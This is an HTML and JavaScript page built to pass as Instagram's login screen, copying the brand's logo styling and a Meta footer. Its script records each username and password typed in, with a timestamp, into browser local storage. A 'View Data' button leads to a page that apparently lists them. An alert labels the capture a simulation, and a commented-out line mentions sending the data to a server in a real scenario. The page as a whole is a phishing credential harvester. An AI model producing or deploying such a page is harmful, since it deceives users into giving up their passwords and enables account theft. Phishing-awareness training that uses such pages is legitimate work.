<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login Page</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .data-btn{
            position: fixed;
            top: 20px;
            right: 20px;
            background-color: #0095f6;
            color: white;
            padding: 8px 15px;
            border-radius: 5px;
            text-decoration: none;
            font-size: 14px;
        }

        .data-btn:hover{
            background-color: #1877f2;
        }

        .container {
            width: 100%;
            max-width: 500px;
            padding: 20px;
        }

        .login-card {
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 40px 30px;
            margin-bottom: 10px;
            text-align: center;
        }

        .logo {
            margin-bottom: 30px;
            font-family: 'Instagram Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            font-size: 40px;
            font-weight: 400;
            color: #262626;
        }

        .logo span {
            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .input-field {
            width: 100%;
            padding: 12px 10px;
            margin: 5px 0;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background-color: #fafafa;
            font-size: 14px;
        }

        .input-field:focus {
            outline: none;
            border-color: #a8a8a8;
            background-color: #ffffff;
        }

        .login-btn {
            width: 100%;
            padding: 10px 0;
            margin: 15px 0 10px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .login-btn:hover {
            background-color: #1877f2;
        }

        .forgot-password {
            display: block;
            margin: 15px 0;
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }

        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .divider::before {
            margin-right: 16px;
        }

        .divider::after {
            margin-left: 16px;
        }

        .facebook-login {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            text-decoration: none;
            margin: 15px 0;
        }

        .facebook-login:hover {
            text-decoration: underline;
        }

        .signup-card {
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px 40px;
            text-align: center;
            font-size: 14px;
        }

        .signup-card a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
            margin-left: 5px;
        }

        .signup-card a:hover {
            text-decoration: underline;
        }

        .meta {
            text-align: center;
            margin-top: 20px;
            color: #8e8e8e;
            font-size: 12px;
        }

        /* Success message styling */
        .success-message {
            background-color: #d4edda;
            color: #155724;
            padding: 10px;
            border-radius: 5px;
            margin-top: 10px;
            font-size: 14px;
            display: none;
        }

        .success-message.show {
            display: block;
        }

        /* Error styling */
        .error-message {
            color: #ed4956;
            font-size: 12px;
            text-align: left;
            margin-top: 2px;
            display: none;
        }

        .error-message.show {
            display: block;
        }
    </style>
</head>
<body>
    <a href="data.html" class="data-btn">View Data</a>
    <div class="container">
        <div class="login-card">
            <div class="logo">
                <span>Instagram</span>
            </div>
            
            <form id="loginForm">
                <input type="text" 
                       class="input-field" 
                       id="username" 
                       name="username" 
                       placeholder="Mobile number, username or email"
                       required>
                <div class="error-message" id="usernameError">Please enter your username/email</div>
                
                <input type="password" 
                       class="input-field" 
                       id="password" 
                       name="password" 
                       placeholder="Password"
                       required>
                <div class="error-message" id="passwordError">Please enter your password</div>
                
                <button type="submit" class="login-btn">Log in</button>
            </form>
            
            <a href="#" class="forgot-password">Forgot password?</a>
        </div>
        
        <div class="signup-card">
            Don't have an account?
            <a href="#">Create new account</a>
        </div>
        
        <div class="meta">
            Meta
        </div>
        
        <div class="success-message" id="successMessage">
            Data Saved Successfully!
        </div>
    </div>
    <div id="dataSection" style="display:none;"></div>


    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Reset error messages
            document.getElementById('usernameError').classList.remove('show');
            document.getElementById('passwordError').classList.remove('show');
            
            // Get form values
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value;
            
            // Validation
            let isValid = true;
            
            if (!username) {
                document.getElementById('usernameError').classList.add('show');
                isValid = false;
            }
            
            if (!password) {
                document.getElementById('passwordError').classList.add('show');
                isValid = false;
            }
            
            if (isValid) {
                // Collect all data
                const loginData = {
                    username: username,
                    password: password,
                    timestamp: new Date().toISOString()
                };  
                
                // Show success message
                const successMsg = document.getElementById('successMessage');
                successMsg.classList.add('show');

                // SAVE DATA
                let storedData = JSON.parse(localStorage.getItem("loginData")) || [];
                storedData.push(loginData);
                localStorage.setItem("loginData", JSON.stringify(storedData));

                alert("Data Saved (Simulation)");
                
                // // Log data to console (in real scenario, you'd send to server)
                // console.log('Login Data Collected:', loginData);
                
                // Optional: Store in localStorage
                
                // localStorage.setItem('lastLogin', JSON.stringify(loginData));
                
                // Clear form (optional - remove if you don't want to clear)
                // document.getElementById('username').value = '';
                // document.getElementById('password').value = '';
                
                // Hide success message after 3 seconds
                setTimeout(() => {
                    successMsg.classList.remove('show');
                }, 3000);
                location.reload();
            }
        });
        
        // Optional: Add real-time validation
        document.getElementById('username').addEventListener('input', function() {
            if (this.value.trim()) {
                document.getElementById('usernameError').classList.remove('show');
            }
        });
        
        document.getElementById('password').addEventListener('input', function() {
            if (this.value) {
                document.getElementById('passwordError').classList.remove('show');
            }
        });
        function showData() {
        document.getElementById("dataSection").style.display = "block";
        }
    </script>
</body>
</html>
